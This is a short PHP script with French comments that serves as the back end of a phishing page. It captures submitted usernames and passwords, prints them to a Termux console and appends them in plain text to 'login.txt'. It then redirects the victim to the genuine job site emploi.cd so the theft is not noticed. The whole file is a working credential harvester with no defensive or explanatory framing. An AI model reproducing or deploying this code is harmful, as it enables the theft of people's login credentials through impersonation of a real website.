<?php
// Vérifie si le formulaire a été soumis via la méthode POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupère et nettoie les données du formulaire
    $username = isset($_POST["username"]) ? htmlspecialchars(trim($_POST["email"])) : '';
    $password = isset($_POST["password"]) ? htmlspecialchars(trim($_POST["password"])) : '';

    // Vérifie si les champs ne sont pas vides
    if (!empty($username) && !empty($password)) {
        // Formate les données pour l'enregistrement
        $data = "Nom d'utilisateur (Email/Téléphone) : " . $username . " | Mot de passe : " . $password . "\n";

        // Affiche dans la console Termux (stdout)
        file_put_contents("php://stdout", $data);

        // Tente d'enregistrer les données dans le fichier 'login.txt'
        $file = "login.txt";
        if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX)) {
            // Si l'enregistrement réussit, redirige l'utilisateur
            header("Location: https://www.emploi.cd/");
            exit();
        } else {
            // Message en cas d'erreur d'écriture
            echo "Erreur : Impossible d'enregistrer les données.";
        }
    } else {
        // Message si les champs sont vides
        echo "Erreur : Veuillez remplir tous les champs.";
    }
} else {
    // Message si le formulaire n'a pas été soumis
    echo "Aucune donnée reçue.";
}
?>
